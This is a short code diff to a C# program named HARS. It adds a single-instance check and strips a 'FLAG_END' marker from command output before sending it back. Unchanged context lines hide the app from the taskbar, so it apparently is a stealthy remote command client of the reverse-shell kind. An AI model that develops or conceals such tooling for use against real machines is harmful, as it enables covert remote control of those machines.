@@ -6,6 +6,7 @@ using System.Data;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Net.Security;
 using System.Reflection;
@@ -29,6 +30,9 @@ namespace HARS
         {
             // Init 
             InitializeComponent();
+            // Check if one instance of process is already running
+            if (Process.GetProcesses().Count(p => p.ProcessName == Process.GetCurrentProcess().ProcessName) > 1)
+                Environment.Exit(0);
             // Set state to minimized
             this.WindowState = FormWindowState.Minimized;
             // Hide app from taskbar
@@ -230,6 +234,7 @@ namespace HARS
                             }
                             reply = IO.stdout;
                         }
+                        reply = reply.Replace("FLAG_END", "");
                         ReplyCmd();
                         IO.stdout = "";
                         IO.stderr = "";
